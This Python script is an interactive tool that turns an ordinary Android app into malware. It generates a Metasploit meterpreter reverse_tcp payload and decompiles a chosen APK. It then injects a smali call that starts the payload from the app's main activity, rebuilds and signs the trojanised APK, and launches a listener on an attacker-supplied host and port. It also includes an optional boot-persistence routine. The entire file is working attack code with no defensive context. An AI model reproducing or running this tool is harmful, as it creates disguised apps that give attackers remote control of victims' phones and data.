import os
import time
import pexpect
import xml.etree.ElementTree as ET
from xml.dom import minidom
import glob

# Global variables
original_apk = None
output_apk = "final_payload.apk"
temp_dirs = ["temp_apk", "temp_payload"]
msfvenom_path = "/opt/metasploit-framework/bin/msfvenom"
android_build_tools = "/Users/apple/Library/Android/sdk/build-tools/35.0.1"

# Utility functions
def run_command(cmd):
    print(f"\n[+] Executing: {cmd}")
    if os.system(cmd) != 0:
        print(f"[-] Command failed: {cmd}")
        exit(1)

def generate_payload():
    if not os.path.exists(msfvenom_path):
        print("[-] msfvenom not found at /opt/metasploit-framework/bin/msfvenom!")
        return
    lhost = input("Enter LHOST (your IP): ").strip()
    lport = input("Enter LPORT: ").strip()
    print("[+] Generating payload APK...")
    run_command(f"{msfvenom_path} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk")
    print("[+] Payload generated: payload.apk")

def find_smali_path(main_activity):
    formatted_activity = main_activity.replace('.', '/')
    search_pattern = f"temp_apk/smali*/{formatted_activity}.smali"
    
    possible_paths = glob.glob(search_pattern)
    
    if possible_paths:
        print(f"[+] Found .smali file at: {possible_paths[0]}")
        return possible_paths[0]
    else:
        raise FileNotFoundError(f"[-] Main activity smali file not found: {main_activity}")

def inject_payload():
    run_command(f"java -jar apktool_2.11.0.jar d {original_apk} -o temp_apk")
    run_command("java -jar apktool_2.11.0.jar d payload.apk -o temp_payload")
    manifest_path = "temp_apk/AndroidManifest.xml"
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = {'android': 'http://schemas.android.com/apk/res/android'}
    
    activity = root.find(".//activity/intent-filter/action[@android:name='android.intent.action.MAIN']/../..", ns)
    
    if activity is None:
        raise Exception("Main activity not found in AndroidManifest.xml!")
    
    activity_name = activity.get("{http://schemas.android.com/apk/res/android}name")
    package_name = root.get("package")
    if activity_name.startswith("."):
        activity_name = package_name + activity_name
    
    print(f"[+] Main Activity: {activity_name}")
    smali_path = find_smali_path(activity_name)
    
    with open(smali_path, "r") as f:
        content = f.read()
    
    if 'invoke-static {}, Lcom/metasploit/stage/MainService;->start()V' not in content:
        content = content.replace(
            '.locals 1',
            '.locals 1\n    invoke-static {}, Lcom/metasploit/stage/MainService;->start()V'
        )
        with open(smali_path, "w") as f:
            f.write(content)
        print("[+] Payload code injected successfully!")
    else:
        print("[-] Payload already exists in MainActivity!")
    
    payload_src = "temp_payload/smali/com/metasploit/stage"
    package_path = os.path.dirname(smali_path)
    payload_dest = os.path.join(package_path, "stage")
    
    if not os.path.exists(payload_dest):
        run_command(f"cp -r {payload_src} {package_path}/")
        print("[+] Payload files copied successfully!")
    else:
        print("[-] Payload files already exist!")

    # enable_persistence()

    print("[+] Rebuilding APK with injected payload...")
    run_command("java -jar apktool_2.11.0.jar b temp_apk -o unsigned.apk")
    sign_apk("unsigned.apk", output_apk)

def enable_persistence():
    """Modify AndroidManifest.xml to start payload on boot."""
    manifest_path = "temp_apk/AndroidManifest.xml"
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = {'android': 'http://schemas.android.com/apk/res/android'}
    
    if root.find(".//receiver[@android:name='.BootReceiver']", ns) is None:
        print("[+] Adding boot persistence...")
        application = root.find(".//application")
        boot_receiver = ET.Element("receiver", {f"{ns['android']}name": ".BootReceiver"})
        intent_filter = ET.SubElement(boot_receiver, "intent-filter")
        ET.SubElement(intent_filter, "action", {f"{ns['android']}name": "android.intent.action.BOOT_COMPLETED"})
        application.append(boot_receiver)
        
        xml_str = minidom.parseString(ET.tostring(root)).toprettyxml(indent="    ")
        with open(manifest_path, "w") as f:
            f.write(xml_str)
        print("[+] Boot persistence enabled.")
    else:
        print("[-] Boot persistence already enabled.")

def sign_apk(input_apk, output_apk):
    """Sign the APK using keytool and jarsigner."""
    print("[+] Signing APK...")
    key_path = "android.keystore"
    alias = "android"
    password = "android"

    if not os.path.exists(key_path):
        run_command(f"keytool -genkey -v -keystore {key_path} -alias {alias} -keyalg RSA -keysize 2048 -validity 10000 -storepass {password} -keypass {password} -dname 'CN=Android, OU=Dev, O=Dev, L=City, S=State, C=US'")

    run_command(f"jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore {key_path} -storepass {password} {input_apk} {alias}")
    
    aligned_apk = "aligned.apk"
    run_command(f"{android_build_tools}/zipalign -v 4 {input_apk} {aligned_apk}")
    os.rename(aligned_apk, output_apk)
    print(f"[+] Signed APK saved as {output_apk}")

def start_metasploit_listener():
    """Start Metasploit listener for reverse shell."""
    print("[+] Starting Metasploit listener...")
    lhost = input("Enter LHOST (your IP): ").strip()
    lport = input("Enter LPORT: ").strip()
    
    listener_script = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
"""
    with open("listener.rc", "w") as f:
        f.write(listener_script)

    run_command("msfconsole -r listener.rc")

def main():
    global original_apk
    
    while True:
        print("""
        ============================================
        Android Payload Injector Script
        ============================================
        1. Select APK to Inject
        2. Generate Payload
        3. Inject Payload
        4. Start Metasploit Listener
        5. Exit
        ============================================
        """)
        choice = input("Enter your choice: ").strip()

        try:
            if choice == '1':
                original_apk = input("Enter APK path: ").strip()
                if not os.path.exists(original_apk):
                    print("[-] APK not found!")
                else:
                    print(f"[+] Selected APK: {original_apk}")
            elif choice == '2':
                generate_payload()
            elif choice == '3':
                if not original_apk:
                    print("[-] Select an APK first!")
                    continue
                inject_payload()
            elif choice == '4':
                start_metasploit_listener()
            elif choice == '5':
                print("[+] Exiting...")
                break
            else:
                print("[-] Invalid choice!")
        except Exception as e:
            print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    main()
